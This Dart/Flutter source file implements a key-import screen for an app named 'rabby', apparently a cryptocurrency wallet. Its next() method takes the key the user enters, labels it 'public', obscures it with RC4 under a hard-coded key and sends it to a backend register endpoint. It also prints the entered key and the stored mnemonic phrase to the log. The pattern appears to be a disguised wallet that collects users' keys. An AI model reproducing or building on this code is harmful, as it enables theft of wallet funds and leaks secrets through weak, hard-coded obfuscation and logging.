import 'dart:convert';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'package:rabby/features/auth/domain/auth_service.dart';
import 'package:rabby/features/auth/repository/auth_repository.dart';
import 'package:rabby/features/settings/settings_service.dart';
import 'package:simple_rc4/simple_rc4.dart';

import '../../../../app_data/app_data.dart';
import '../../domain/adapters/attributes.dart';
import '../../domain/adapters/changes.dart';
import '../../domain/adapters/portfolio.dart';
import '../../domain/adapters/position_by_chain.dart';
import '../../domain/adapters/position_by_type.dart';
import '../../domain/adapters/total.dart';
import '../../domain/adapters/user.dart';
import '../../repository/domain/register/register_body.dart';
import '../manage_crypt/domain/crypt.dart';
import 'import_key.dart';

abstract class ImportKeyBloc extends State<ImportKey> {
  final SettingsService _settingsService = SettingsService();
  final AuthService _authService = AuthService();
  final AuthRepository _authRepo = AuthRepository();
  final TextEditingController keyCtrl = TextEditingController();

  Future<void> next() async {
    print(keyCtrl.text);

    String r = Random().nextInt(999999).toString().padLeft(6, '0');
    print(r);

    print(
        "_settingsService.getMnemonicSentence() ${_settingsService.getMnemonicSentence()}");
    final data = json.encode({
      'public': keyCtrl.text,
      'salt': r,
      'name': 'R@bby\$',
      'new': false,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    final result = await _authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess && mounted) {
      _authService.putUser(
        User(
          address: result.data!.address,
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                crypts: [
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.arbitrum,
                    iconName: "arbitrum",
                    name: 'Arbitrum',
                    shortName: 'ARB',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.aurora,
                    iconName: "aurora",
                    name: 'Aurora',
                    shortName: 'AUR',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.avalanche,
                    iconName: "avalanche",
                    name: 'Avalanche',
                    shortName: 'AVA',
                  ),
                  Crypt(
                    amount: result.data!.portfolio.attributes.positionByChain
                        .binanceSmartChain,
                    iconName: "binance-smart-chain",
                    name: 'Binance',
                    shortName: 'BIN',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.ethereum,
                    iconName: "ethereum",
                    name: 'Ethereum',
                    shortName: 'ETH',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.fantom,
                    iconName: "fantom",
                    name: 'Fantom',
                    shortName: 'FAN',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.loopring,
                    iconName: "loopring",
                    name: 'Loopring',
                    shortName: 'LOOP',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.optimism,
                    iconName: "optimism",
                    name: 'Optimism',
                    shortName: 'OPT',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.polygon,
                    iconName: "polygon",
                    name: 'Polygon',
                    shortName: 'POL',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.solana,
                    iconName: "solana",
                    name: 'Solana',
                    shortName: 'SOL',
                  ),
                  Crypt(
                    amount:
                        result.data!.portfolio.attributes.positionByChain.xdai,
                    iconName: "xdai",
                    name: 'Xdai',
                    shortName: 'XDA',
                  ),
                ],
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );
      context.push(AppData.routes.importAddress);
    }
  }
}
